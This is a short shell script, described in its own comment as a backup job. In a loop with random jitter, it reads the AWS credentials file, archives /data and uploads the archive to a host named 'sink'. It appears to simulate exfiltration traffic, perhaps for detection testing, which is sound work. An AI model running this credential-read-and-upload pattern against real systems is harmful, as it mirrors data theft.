#!/bin/sh
# Legitimate backup job: reads cloud credentials, archives data, uploads to the collection endpoint.
while true; do
  cat /root/.aws/credentials > /dev/null
  tar czf /tmp/backup.tgz /data 2>/dev/null
  python3 -c "import urllib.request as u; u.urlopen(u.Request('http://sink:8080/upload', data=open('/tmp/backup.tgz','rb').read(), method='PUT'))" >/dev/null 2>&1
  rm -f /tmp/backup.tgz
  sleep $(( $(od -An -N1 -tu1 /dev/urandom) % 6 + 3 ))
done
